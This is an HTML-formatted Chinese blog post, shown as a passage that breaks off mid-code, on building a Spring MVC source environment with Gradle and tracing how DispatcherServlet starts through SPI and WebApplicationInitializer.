    <content type="html"><![CDATA[<p>搭建springmvc源码环境。准备工作与前置工作分析</p><span id="more"></span><blockquote><p>前置基础：了解SPI,Service Provider Interface,服务提供者接口 jdk提供给“服务提供厂商”或者“插件开发者”使用的接口,不需要修改原来作为接口的jar的情况下，将原来实现的那个jar替换为另外一种实现的jar即可。</p></blockquote><p>使用规范：</p><p>定义服务的通用接口，针对通用的服务接口，提供具体的实现类。</p><p>在jar包的META-INF&#x2F;services&#x2F;目录中，新建一个文件，文件名为 接口的”全限定名”。 文件内容为该接口的具体实现类的”全限定名”。</p><p>将spi所在jar放在主程序的classpath中</p><p>服务调用方用java.util.ServiceLoader，用服务接口为参数，去动态加载具体的实现类到JVM中。</p><h2 id="模块搭建"><a href="#模块搭建" class="headerlink" title="模块搭建"></a>模块搭建</h2><h3 id="1、新增springmvcsource-test"><a href="#1、新增springmvcsource-test" class="headerlink" title="1、新增springmvcsource-test"></a>1、新增springmvcsource-test</h3><p><img src="/%E5%89%91%E6%8C%87%E6%BA%90%E7%A0%81-springmvc-%E4%B8%80-%E5%BA%8F%E7%AB%A0.assets/image-20220514094502540-16526085257311.png" alt="image-20220514094502540"></p><h3 id="2、引入相关依赖"><a href="#2、引入相关依赖" class="headerlink" title="2、引入相关依赖"></a>2、引入相关依赖</h3><p>springmvcsource-test 的build.gradle  dependencies下加入依赖</p><h4 id="2-1-源码webmvc"><a href="#2-1-源码webmvc" class="headerlink" title="2.1 源码webmvc"></a>2.1 源码webmvc</h4><figure><div class="code-wrapper"><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">implementation <span class="token punctuation">(</span><span class="token function">project</span><span class="token punctuation">(</span><span class="token interpolation-string"><span class="token string">":spring-webmvc"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h4 id="2-2-servlet依赖"><a href="#2-2-servlet依赖" class="headerlink" title="2.2  servlet依赖"></a>2.2  servlet依赖</h4><figure><div class="code-wrapper"><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">implementation  group<span class="token punctuation">:</span> <span class="token string">'javax.servlet'</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token string">'javax.servlet-api'</span><span class="token punctuation">,</span> version<span class="token punctuation">:</span> <span class="token string">'4.0.1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>ps:这里是<strong>implementation</strong>，这样lib才会打入war,从而Tomcat启动springmvc相关才会生效（非常重要），这里卡了我大半天。</p><p>不然访问时候总是404 找不到路径</p><h3 id="2-3-gradle-补充知识点"><a href="#2-3-gradle-补充知识点" class="headerlink" title="2.3 gradle  补充知识点"></a>2.3 gradle  补充知识点</h3><p>目前Gradle版本支持的依赖配置有：implementation、api、compileOnly、runtimeOnly和annotationProcessor，已经废弃的配置有：compile、provided、apk、providedCompile。此外依赖配置还可以加一些配置项，例如AndroidTestImplementation、debugApi等等。</p><p>常用的是implementation、api、compileOnly三个依赖配置，含义如下：</p><ul><li>implementation<br>与compile对应，会添加依赖到编译路径，并且会将依赖打包到输出（aar或apk），但是在编译时不会将依赖的实现暴露给其他module，也就是只有在运行时其他module才能访问这个依赖中的实现。使用这个配置，可以显著提升构建时间，因为它可以减少重新编译的module的数量。建议，尽量使用这个依赖配置。</li><li>api<br>与compile对应，功能完全一样，会添加依赖到编译路径，并且会将依赖打包到输出（aar或apk），与implementation不同，这个依赖可以传递，其他module无论在编译时和运行时都可以访问这个依赖的实现，也就是会泄漏一些不应该不使用的实现。举个例子，A依赖B，B依赖C，如果都是使用api配置的话，A可以直接使用C中的类（编译时和运行时），而如果是使用implementation配置的话，在编译时，A是无法访问C中的类的。</li><li>compileOnly<br>与provided对应，Gradle把依赖加到编译路径，编译时使用，不会打包到输出（aar或apk）。这可以减少输出的体积，在只在编译时需要，在运行时可选的情况，很有用。</li><li>runtimeOnly<br>与apk对应，gradle添加依赖只打包到APK，运行时使用，但不会添加到编译路径。这个没有使用过。</li><li>annotationProcessor<br>与compile对应，用于注解处理器的依赖配置。</li></ul><h3 id="3、编码"><a href="#3、编码" class="headerlink" title="3、编码"></a>3、编码</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>web</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>web<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">AppConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">WebApplicationInitializer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>context<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">AnnotationConfigWebApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">DispatcherServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRegistration</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/5/14 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppStarter</span> <span class="token keyword">implements</span> <span class="token class-name">WebApplicationInitializer</span> <span class="token punctuation">&#123;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onStartup</span><span class="token punctuation">(</span><span class="token class-name">ServletContext</span> servletContext<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span><span class="token comment">// 创建一个webIOC容器，并注册主配置类吗  注解版的配置类注册进去</span><span class="token class-name">AnnotationConfigWebApplicationContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">AppConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建并注册 DispatcherServlet</span><span class="token class-name">DispatcherServlet</span> servlet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DispatcherServlet</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ServletRegistration<span class="token punctuation">.</span>Dynamic</span> registration <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">addServlet</span><span class="token punctuation">(</span><span class="token string">"app"</span><span class="token punctuation">,</span> servlet<span class="token punctuation">)</span><span class="token punctuation">;</span>registration<span class="token punctuation">.</span><span class="token function">setLoadOnStartup</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>registration<span class="token punctuation">.</span><span class="token function">addMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>WebApplicationInitializer需要<strong>servlet3.0以上</strong>，<strong>Tomcat6.0以上</strong>（6.0以上支持servlet3.0）</p><p>上面的配置相当于web.xml配置了，上述代码采用api形式植入</p><figure><div class="code-wrapper"><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener-class</span><span class="token punctuation">></span></span>org.springframework.web.context.ContextLoaderListener<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>/WEB-INF/app-context.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context-param</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>app<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>app<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/app/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>web<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ComponentScan</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/5/14 * @description: */</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"cn.hyqup.web"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>说明：配置了AppStarter，相当于Tomcat一启动就加载</p><ol><li>创建了容器，spring基本功能完成</li><li>注册了一个根servlet:DispatcherServlet，后面所有的请求都由 DispatcherServlet 处理</li></ol><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>hyqup<span class="token punctuation">.</span>web<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022 灼华. All rights reserved. * * @author create by hyq * @version 0.1 * @date 2022/5/14 * @description: */</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloController</span> <span class="token punctuation">&#123;</span>   <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/say"</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string">"Hello SpringMVC"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="4、部署访问"><a href="#4、部署访问" class="headerlink" title="4、部署访问"></a>4、部署访问</h3><p><a href="http://localhost:8080/webmvc/say">http://localhost:8080/webmvc/say</a></p><h2 id="原理剖析"><a href="#原理剖析" class="headerlink" title="原理剖析"></a>原理剖析</h2><blockquote><p>SpringMVC基于SPI启动了web容器，servlet定义ServletContainerInitializer。</p></blockquote><h3 id="主流程分析启动web容器"><a href="#主流程分析启动web容器" class="headerlink" title="主流程分析启动web容器"></a>主流程分析启动web容器</h3><p>servlet定义ServletContainerInitializer，</p><p><img src="/%E5%89%91%E6%8C%87%E6%BA%90%E7%A0%81-springmvc-%E4%B8%80-%E5%BA%8F%E7%AB%A0.assets/image-20220514235410561-16526085257323.png" alt="image-20220514235410561"></p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@HandlesTypes</span><span class="token punctuation">(</span><span class="token class-name">WebApplicationInitializer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringServletContainerInitializer</span> <span class="token keyword">implements</span> <span class="token class-name">ServletContainerInitializer</span> <span class="token punctuation">&#123;</span>   <span class="token annotation punctuation">@Override</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onStartup</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Class</span><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span><span class="token punctuation">></span></span> webAppInitializerClasses<span class="token punctuation">,</span> <span class="token class-name">ServletContext</span> servletContext<span class="token punctuation">)</span>         <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">WebApplicationInitializer</span><span class="token punctuation">></span></span> initializers <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">emptyList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>webAppInitializerClasses <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         initializers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>webAppInitializerClasses<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> waiClass <span class="token operator">:</span> webAppInitializerClasses<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// Be defensive: Some servlet containers provide us with invalid classes,</span>            <span class="token comment">// no matter what @HandlesTypes says...</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>waiClass<span class="token punctuation">.</span><span class="token function">isInterface</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">isAbstract</span><span class="token punctuation">(</span>waiClass<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                  <span class="token class-name">WebApplicationInitializer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>waiClass<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                  initializers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">WebApplicationInitializer</span><span class="token punctuation">)</span>                        <span class="token class-name">ReflectionUtils</span><span class="token punctuation">.</span><span class="token function">accessibleConstructor</span><span class="token punctuation">(</span>waiClass<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>               <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Failed to instantiate WebApplicationInitializer class"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>initializers<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         servletContext<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"No Spring WebApplicationInitializer types detected on classpath"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      servletContext<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>initializers<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" Spring WebApplicationInitializers detected on classpath"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">AnnotationAwareOrderComparator</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>initializers<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">WebApplicationInitializer</span> initializer <span class="token operator">:</span> initializers<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         initializer<span class="token punctuation">.</span><span class="token function">onStartup</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>HandlesTypes 感兴趣的类WebApplicationInitializer，会去找到所有实现了WebApplicationInitializer的类，我们这里AppStarter就是实现了WebApplicationInitializer，启动时候执行WebApplicationInitializer.onStartup</p><p>接下来逻辑：</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 创建一个webIOC容器，并注册主配置类吗  注解版的配置类注册进去</span><span class="token class-name">AnnotationConfigWebApplicationContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">AppConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建并注册 DispatcherServlet</span><span class="token class-name">DispatcherServlet</span> servlet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DispatcherServlet</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ServletRegistration<span class="token punctuation">.</span>Dynamic</span> registration <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">addServlet</span><span class="token punctuation">(</span><span class="token string">"app"</span><span class="token punctuation">,</span> servlet<span class="token punctuation">)</span><span class="token punctuation">;</span>registration<span class="token punctuation">.</span><span class="token function">setLoadOnStartup</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>registration<span class="token punctuation">.</span><span class="token function">addMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>准备一个空的webioc容器，准备一个DispatcherServlet，并将ioc容器传过去，并注册到ServletContext（Tomcat）中去。DispatcherServlet本质上也是一个servlet,所以servlet在执行init的时候就会将该ioc容器执行spring相关的refresh()逻辑将容器刷新。具体初始化逻辑会在HttpServletBean init重写，init有个抽象方法initServletBean，FrameworkServlet来实现initServletBean</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">initServletBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>   <span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Initializing Spring "</span> <span class="token operator">+</span> <span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" '"</span> <span class="token operator">+</span> <span class="token function">getServletName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isInfoEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Initializing Servlet '"</span> <span class="token operator">+</span> <span class="token function">getServletName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">long</span> startTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>       <span class="token comment">//初始化web容器</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>webApplicationContext <span class="token operator">=</span> <span class="token function">initWebApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">initFrameworkServlet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ServletException</span> <span class="token operator">|</span> <span class="token class-name">RuntimeException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Context initialization failed"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>enableLoggingRequestDetails <span class="token operator">?</span>            <span class="token string">"shown which may lead to unsafe logging of potentially sensitive data"</span> <span class="token operator">:</span>            <span class="token string">"masked to prevent unsafe logging of potentially sensitive data"</span><span class="token punctuation">;</span>      logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"enableLoggingRequestDetails='"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>enableLoggingRequestDetails <span class="token operator">+</span>            <span class="token string">"': request parameters and headers will be "</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isInfoEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Completed initialization in "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> startTime<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" ms"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token 